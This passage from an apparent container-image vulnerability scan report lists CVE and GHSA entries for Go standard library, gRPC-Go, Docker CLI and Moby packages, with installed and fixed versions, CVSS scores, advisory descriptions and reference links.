│     │      ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
│     │      │                   encoded-words can consume excessive CPU. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-407 
│     │      ├ VendorSeverity   ╭ amazon : 2 
│     │      │                  ├ azure  : 3 
│     │      │                  ├ bitnami: 3 
│     │      │                  ╰ redhat : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
│     │      │                  ├ [1]: https://go.dev/cl/774481 
│     │      │                  ├ [2]: https://go.dev/issue/79217 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
│     │      ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
│     │      ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
│     ├ [20] ╭ VulnerabilityID : CVE-2026-42505 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5856 
│     │      ├ PkgID           : stdlib@v1.26.3 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│     │      │                  ╰ UID : d70a4c65b1ff5c43 
│     │      ├ InstalledVersion: v1.26.3 
│     │      ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:3d6853079257b68c30b055c28651c4d0d73b0eca13002acd9018bbb10f98469d 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
│     │      │                   Hello 
│     │      ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
│     │      │                   passive network observer due to a disclosure of pre-shared key identities in
│     │      │                   the unencrypted client hello. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-201 
│     │      ├ VendorSeverity   ╭ amazon : 2 
│     │      │                  ├ bitnami: 2 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                  │         ╰ V3Score : 5.3 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
│     │      │                            ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
│     │      │                  ├ [1]: https://go.dev/cl/775960 
│     │      │                  ├ [2]: https://go.dev/issue/79282 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
│     │      ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
│     │      ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
│     ╰ [21] ╭ VulnerabilityID : CVE-2026-42507 
│            ├ VendorIDs        ─ [0]: GO-2026-5039 
│            ├ PkgID           : stdlib@v1.26.3 
│            ├ PkgName         : stdlib 
│            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
│            │                  ╰ UID : d70a4c65b1ff5c43 
│            ├ InstalledVersion: v1.26.3 
│            ├ FixedVersion    : 1.25.11, 1.26.4 
│            ├ Status          : fixed 
│            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
│            ├ DataSource       ╭ ID  : govulndb 
│            │                  ├ Name: The Go Vulnerability Database 
│            │                  ╰ URL : https://pkg.go.dev/vuln/ 
│            ├ Fingerprint     : sha256:89db7cc5e1cb7c719f321c3f3f37b48889dd1a7807d8c9858200f2e62ecc5320 
│            ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
│            │                   input injection 
│            ├ Description     : When returning errors, functions in the net/textproto package would include
│            │                   its input as part of the error. This might allow an attacker to inject
│            │                   misleading content to errors that are printed or logged. 
│            ├ Severity        : MEDIUM 
│            ├ VendorSeverity   ╭ alma       : 2 
│            │                  ├ amazon     : 2 
│            │                  ├ bitnami    : 2 
│            │                  ├ oracle-oval: 2 
│            │                  ├ redhat     : 2 
│            │                  ╰ rocky      : 2 
│            ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│            │                  │         ╰ V3Score : 5.3 
│            │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
│            │                            ╰ V3Score : 5.3 
│            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
│            │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
│            │                  ├ [2] : https://bugzilla.redhat.com/2484205 
│            │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
│            │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
│            │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
│            │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:29980 
│            │                  ├ [7] : https://go.dev/cl/777060 
│            │                  ├ [8] : https://go.dev/issue/79346 
│            │                  ├ [9] : https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
│            │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-42507.html 
│            │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
│            │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
│            │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-5039 
│            │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
│            ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
│            ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
├ [2] ╭ [0] ╭ VulnerabilityID : CVE-2026-46600 
│     │     ├ VendorIDs        ─ [0]: GO-2026-5942 
│     │     ├ PkgID           : golang.org/x/net@v0.55.0 
│     │     ├ PkgName         : golang.org/x/net 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.55.0 
│     │     │                  ╰ UID : 797ef4bf548924eb 
│     │     ├ InstalledVersion: v0.55.0 
│     │     ├ FixedVersion    : 0.56.0 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:0b7ab6f201d698d5f723e5926de43172f785e196db970d245238d5ac7f13e3bd 
│     │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size of a param ... 
│     │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size of a parameter
│     │     │                   value overflows the message buffer. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ CweIDs           ─ [0]: CWE-125 
│     │     ├ References       ╭ [0]: https://go.dev/cl/786345 
│     │     │                  ├ [1]: https://go.dev/issue/79795 
│     │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│     │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│     │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ├ [1] ╭ VulnerabilityID : CVE-2026-56852 
│     │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│     │     ├ PkgID           : golang.org/x/text@v0.38.0 
│     │     ├ PkgName         : golang.org/x/text 
│     │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.38.0 
│     │     │                  ╰ UID : 90b09d89a338d701 
│     │     ├ InstalledVersion: v0.38.0 
│     │     ├ FixedVersion    : 0.39.0 
│     │     ├ Status          : fixed 
│     │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│     │     ├ DataSource       ╭ ID  : govulndb 
│     │     │                  ├ Name: The Go Vulnerability Database 
│     │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │     ├ Fingerprint     : sha256:d1fe7bcdeb60cb8a86ba43f727698f13b6054b79ac78e44a2a874a74f3bc483b 
│     │     ├ Title           : A norm.Iter can enter an infinite loop when handling input containing  ... 
│     │     ├ Description     : A norm.Iter can enter an infinite loop when handling input containing invalid
│     │     │                   UTF-8 bytes. 
│     │     ├ Severity        : UNKNOWN 
│     │     ├ CweIDs           ─ [0]: CWE-835 
│     │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│     │     │                  ├ [1]: https://go.dev/issue/80142 
│     │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
│     │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│     │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│     ╰ [2] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│           ├ PkgID           : google.golang.org/grpc@v1.80.0 
│           ├ PkgName         : google.golang.org/grpc 
│           ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.80.0 
│           │                  ╰ UID : 29dcebeabb17f806 
│           ├ InstalledVersion: v1.80.0 
│           ├ FixedVersion    : 1.82.1 
│           ├ Status          : fixed 
│           ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│           │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│           ├ SeveritySource  : ghsa 
│           ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│           ├ DataSource       ╭ ID  : ghsa 
│           │                  ├ Name: GitHub Security Advisory Go 
│           │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│           ├ Fingerprint     : sha256:649c843a5f66001600124764076cbd5340914986014818fc9c73e0139619e7bc 
│           ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│           ├ Description     : Multiple security vulnerabilities have been identified and addressed in grpc-go
│           │                    affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2
│           │                    transport server implementation (internal/transport). These vulnerabilities
│           │                   could result in:
│           │                   
│           │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC policies
│           │                   containing `Metadata` or `RequestedServerName` fields.
│           │                   - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset
│           │                   mitigation bypass during client-initiated stream resets.
│           │                   - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies
│           │                   containing `NOT` rules around unsupported fields.
│           │                   ### Impact
│           │                   _What kind of vulnerability is it? Who is impacted?_
│           │                   #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName`
│           │                   matchers
│           │                   - Affected Component: xDS RBAC 
│           │                   - Impact: When building policy matchers for gRPC RBAC from xDS configurations,
│           │                   unsupported `permission` and `principal` rules (specifically `Metadata` and
│           │                   `RequestedServerName`) were silently ignored and treated as no-ops.
│           │                     - If an authorization policy relied purely on these matchers for access
│           │                   control, treating those rules as no-ops effectively removed the restrictions.
│           │                   - If these unsupported rules were nested inside logical `NOT` rules
│           │                   (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules,
│           │                   silently dropping them changed the boolean logic flow of the authorization
│           │                   engine.
│           │                   As a result, policy evaluation decisions could fail open, allowing unauthorized
│           │                    clients to access protected gRPC services or resources.
│           │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream
│           │                   Aborts
│           │                   - Affected Component: HTTP/2 transport
│           │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied
│           │                   threshold checks to items that directly resulted in control frames being
│           │                   written back to the wire, such as `SETTINGS` ACKs or server-initiated
│           │                   `RST_STREAM`s.
│           │                   When a client initiated a rapid flood of stream creation (`HEADERS`)
│           │                   immediately followed by stream termination `RST_STREAM`, items queued up in the
│           │                    control buffer without counting against the transport response frame
│           │                   threshold. An attacker can repeatedly trigger this flood sequence to bypass
│           │                   reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
│           │                   #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields inside
│           │                    NOT Rules
│           │                   - Impact: The xDS RBAC policy translators recursively generate matchers for
│           │                   nested rules. When a `NOT` rule wrapped an unsupported or unhandled field (such
│           │                    as `SourcedMetadata`), the recursive step returned an empty matcher. This
│           │                   could result in a runtime panic when the RBAC engine attempts to authorize an
│           │                   incoming request.
│           │                   An attacker or misconfigured/malicious xDS management server delivering an
│           │                   LDS/RDS update containing a `NOT` rule around an unhandled field causes the
│           │                   gRPC server process to crash immediately (CWE-248 / Denial of Service).
│           │                   ### Patches
│           │                   _Has the problem been patched? What versions should users upgrade to?_
│           │                   All three issues have been fixed in `master` and will be released in 1.82.1
│           │                   shortly.
│           │                   ### Workarounds
│           │                   _Is there a way for users to fix or remediate the vulnerability without
│           │                   upgrading?_
│           │                   If upgrading grpc-go immediately is not possible, apply the following
│           │                   workarounds based on your deployment architecture:
│           │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management
│           │                   servers do not push RBAC policies containing `Metadata`, `RequestedServerName`,
│           │                    or `NOT` rules wrapping unsupported fields (such as `SourcedMetadata`) to
│           │                   grpc-go servers.
│           │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load
│           │                   balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits
│           │                   and active rate limiting on `RST_STREAM` frequency per connection.
│           │                   ### Severity
│           │                     | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score |
│           │                   Primary Impact |
│           │                     | :--- | :--- | :--- | :--- |
│           │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access
│           │                   / Fail-Open |
│           │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU Consumption
│           │                    / Denial of Service |
│           │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash /
│           │                   Denial of Service | 
│           ├ Severity        : HIGH 
│           ├ VendorSeverity   ─ ghsa: 3 
│           ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/S
│           │                         │            A:N 
│           │                         ╰ V40Score : 8.8 
│           ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
│           │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c1977
│           │                  │      0b2935 
│           │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
│           │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
│           │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf 
│           ├ PublishedDate   : 2026-07-21T22:03:55Z 
│           ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
├ [3] ╭ [0]  ╭ VulnerabilityID : CVE-2025-15558 
│     │      ├ VendorIDs        ─ [0]: GHSA-p436-gjf2-799p 
│     │      ├ PkgID           : github.com/docker/cli@v28.0.2+incompatible 
│     │      ├ PkgName         : github.com/docker/cli 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/cli@v28.0.2%2Bincompatible 
│     │      │                  ╰ UID : 88851239871c0131 
│     │      ├ InstalledVersion: v28.0.2+incompatible 
│     │      ├ FixedVersion    : 29.2.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2025-15558 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:62d2799e319457fd8c8159b8893a26c5aeb0c31f735d20fe03f5700e0c9bb23a 
│     │      ├ Title           : docker/cli: Docker CLI for Windows: Privilege escalation via malicious plugin
│     │      │                   binaries 
│     │      ├ Description     : Docker CLI for Windows searches for plugin binaries in
│     │      │                   C:\ProgramData\Docker\cli-plugins, a directory that does not exist by default.
│     │      │                    A low-privileged attacker can create this directory and place malicious CLI
│     │      │                   plugin binaries (docker-compose.exe, docker-buildx.exe, etc.) that are
│     │      │                   executed when a victim user opens Docker Desktop or invokes Docker CLI plugin
│     │      │                   features, and allow privilege-escalation if the docker CLI is executed as a
│     │      │                   privileged user.
│     │      │                   
│     │      │                   This issue affects Docker CLI: through 29.1.5 and Windows binaries acting as a
│     │      │                    CLI-plugin manager using the  github.com/docker/cli/cli-plugins/manager
│     │      │                   https://pkg.go.dev/github.com/docker/cli@v29.1.5+incompatible/cli-plugins/mana
│     │      │                   ger  package, such as Docker Compose.
│     │      │                   This issue does not impact non-Windows binaries, and projects not using the
│     │      │                   plugin-manager code. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-427 
│     │      ├ VendorSeverity   ╭ bitnami: 3 
│     │      │                  ├ ghsa   : 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V40Vector: CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI
│     │      │                  │         │            :N/SA:N/AU:N/R:U 
│     │      │                  │         ╰ V40Score : 7 
│     │      │                  ├ ghsa    ╭ V40Vector: CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI
│     │      │                  │         │            :N/SA:N 
│     │      │                  │         ╰ V40Score : 7 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H 
│     │      │                  │         ╰ V3Score : 8 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H 
│     │      │                            ╰ V3Score : 7.3 
│     │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-15558 
│     │      │                  ├ [1] : https://bugzilla.redhat.com/show_bug.cgi?id=2444574 
│     │      │                  ├ [2] : https://docs.docker.com/desktop/release-notes 
│     │      │                  ├ [3] : https://docs.docker.com/desktop/release-notes/ 
│     │      │                  ├ [4] : https://github.com/docker/cli 
│     │      │                  ├ [5] : https://github.com/docker/cli/commit/13759330b1f7e7cb0d67047ea42c548254
│     │      │                  │       8ba7fa 
│     │      │                  ├ [6] : https://github.com/docker/cli/pull/6713 
│     │      │                  ├ [7] : https://github.com/docker/cli/security/advisories/GHSA-p436-gjf2-799p 
│     │      │                  ├ [8] : https://github.com/docker/compose/pull/12300 
│     │      │                  ├ [9] : https://nvd.nist.gov/vuln/detail/CVE-2025-15558 
│     │      │                  ├ [10]: https://security.access.redhat.com/data/csaf/v2/vex/2025/cve-2025-15558
│     │      │                  │       .json 
│     │      │                  ├ [11]: https://www.cve.org/CVERecord?id=CVE-2025-15558 
│     │      │                  ├ [12]: https://www.zerodayinitiative.com/advisories/ZDI-CAN-28304 
│     │      │                  ╰ [13]: https://www.zerodayinitiative.com/advisories/ZDI-CAN-28304/ 
│     │      ├ PublishedDate   : 2026-03-04T17:16:14.763Z 
│     │      ╰ LastModifiedDate: 2026-07-15T02:17:22.307Z 
│     ├ [1]  ╭ VulnerabilityID : CVE-2026-34040 
│     │      ├ VendorIDs        ─ [0]: GHSA-x744-4wpc-v9h2 
│     │      ├ PkgID           : github.com/docker/docker@v28.0.4+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.0.4%2Bincompatible 
│     │      │                  ╰ UID : 55fb5abb1612e962 
│     │      ├ InstalledVersion: v28.0.4+incompatible 
│     │      ├ FixedVersion    : 29.3.1 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-34040 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:8b215967a26b20e74604e9ba7b3fe6242b87e755d1f8a07bc6a766e2fcb21476 
│     │      ├ Title           : Moby: Moby: Authorization bypass vulnerability 
│     │      ├ Description     : Moby is an open source container framework. Prior to version 29.3.1, a
│     │      │                   security vulnerability has been detected that allows attackers to bypass
│     │      │                   authorization plugins (AuthZ). This issue has been patched in version
│     │      │                   29.3.1. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-288 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ nvd   : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 2 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 8.8 
│     │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                  │        ╰ V3Score : 7.8 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.4 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-34040 
│     │      │                  ├ [1]: https://docs.docker.com/engine/extend/plugins_authorization 
│     │      │                  ├ [2]: https://github.com/moby/moby 
│     │      │                  ├ [3]: https://github.com/moby/moby/commit/e89edb19ad7de0407a5d31e3111cb01aa10b
│     │      │                  │      5a38 
│     │      │                  ├ [4]: https://github.com/moby/moby/releases/tag/docker-v29.3.1 
│     │      │                  ├ [5]: https://github.com/moby/moby/security/advisories/GHSA-v23v-6jw2-98fq 
│     │      │                  ├ [6]: https://github.com/moby/moby/security/advisories/GHSA-x744-4wpc-v9h2 
│     │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-34040 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-34040 
│     │      ├ PublishedDate   : 2026-03-31T03:15:57.883Z 
│     │      ╰ LastModifiedDate: 2026-06-17T10:38:28.383Z 
│     ├ [2]  ╭ VulnerabilityID : CVE-2026-41567 
│     │      ├ VendorIDs        ─ [0]: GHSA-x86f-5xw2-fm2r 
│     │      ├ PkgID           : github.com/docker/docker@v28.0.4+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.0.4%2Bincompatible 
│     │      │                  ╰ UID : 55fb5abb1612e962 
│     │      ├ InstalledVersion: v28.0.4+incompatible 
│     │      ├ Status          : affected 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41567 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:23cf3b6df17e93cf94f6afd6e643bd39aaa525313d70eeefee4efbc128660550 
│     │      ├ Title           : docker: Moby/Docker Engine: Arbitrary Code Execution via malicious container
│     │      │                   image and compressed archive upload 
│     │      ├ Description     : Moby is an open source container framework. In versions prior to 29.5.1 and in
│     │      │                    moby/moby v2 prior to v2.0.0-beta.14, when a compressed archive is uploaded
│     │      │                   to a container via `PUT /containers/{id}/archive` or piped through `docker cp
│     │      │                   -`, the daemon resolves decompression binaries (such as `xz` or `unpigz`) from
│     │      │                    the container's filesystem rather than the host's due to incorrect ordering
│     │      │                   of operations. A malicious container image containing a trojanized
│     │      │                   decompression binary can achieve arbitrary code execution with full daemon
│     │      │                   privileges, including host root UID and unrestricted capabilities, when a user
│     │      │                    uploads a compressed (xz or gzip) archive into that container. This issue is
│     │      │                   fixed in Docker Engine 29.5.1 and moby/moby v2.0.0-beta.14. Workarounds
│     │      │                   include only running containers from trusted images, using authorization
│     │      │                   plugins to restrict access to the `PUT /containers/{id}/archive` endpoint, and
│     │      │                    avoiding piping compressed archives into containers created from untrusted
│     │      │                   images 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-427 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 3 
│     │      │                  ├ photon: 3 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 7.2 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:41030 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:42852 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:44622 
│     │      │                  ├ [4] : https://access.redhat.com/security/cve/CVE-2026-41567 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2485356 
│     │      │                  ├ [6] : https://github.com/moby/moby 
│     │      │                  ├ [7] : https://github.com/moby/moby/security/advisories/GHSA-x86f-5xw2-fm2r 
│     │      │                  ├ [8] : https://nvd.nist.gov/vuln/detail/CVE-2026-41567 
│     │      │                  ├ [9] : https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-41567
│     │      │                  │       .json 
│     │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2026-41567 
│     │      ├ PublishedDate   : 2026-06-05T02:17:13.817Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:57.79Z 
│     ├ [3]  ╭ VulnerabilityID : CVE-2026-42306 
│     │      ├ VendorIDs        ─ [0]: GHSA-rg2x-37c3-w2rh 
│     │      ├ PkgID           : github.com/docker/docker@v28.0.4+incompatible 
│     │      ├ PkgName         : github.com/docker/docker 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/docker/docker@v28.0.4%2Bincompatible 
│     │      │                  ╰ UID : 55fb5abb1612e962 
│     │      ├ InstalledVersion: v28.0.4+incompatible 
│     │      ├ Status          : affected 
